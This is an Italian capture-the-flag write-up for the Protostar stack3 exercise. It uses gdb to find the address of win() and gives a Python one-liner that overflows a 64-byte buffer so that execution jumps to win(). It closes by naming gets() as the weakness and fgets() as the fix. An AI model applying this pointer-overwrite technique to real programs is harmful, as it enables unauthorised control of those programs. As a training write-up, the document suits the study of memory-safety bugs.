# Protostar_stack 3 - Stack-based buffer overflow

## Obiettivo della sfida
Impostare `fp = win` a tempo di esecuzione, questo implica la modifica del flusso di esecuzione per provocare il salto del codice alla funzione win().

## Raccolta informazioni
Il programma accetta solo input da tastiera o da un altro processo. Stack3 è simile alle precedenti ma la difficoltà aggiunta sta nel fatto che non sappiamo il numero da iniettare per fare eseguire _win()_ quindi bisogna trovarlo.

## Strategia di attacco
Utilizzare il debugger **gdb** e **objdump** per ottenere informazioni sul file.  
Il nostro obiettivo è recuperare l'indirizzo di win() a partire dal binario di _stack3_, una volta trovato l'indizzo lo mettiamo alla fine della stringa di 64 byte(ricordarsi sempre dell'architettura little endian).
### Recuperare l'indirizzo di win()
Utilizziamo gdb
```bash
> gdb -q /opt/protostar/bin/stack3
(gdb) > p win
$1 = {void(void)} 0x8048424 <win> 
#0x8048424 indirizzo di win
```
### Istruzioni da eseguire
```bash
> python -c 'print "a" * 64 + "\x24\x84\x04\x08"' | /opt/protostart/bin/stack3
# sfida vinta
```
## Debolezze
1. `gets()` non effettua controlli sul buffer overflow

## Mitigazione
1. sostituire la funzione`gets()` con `fgets()`
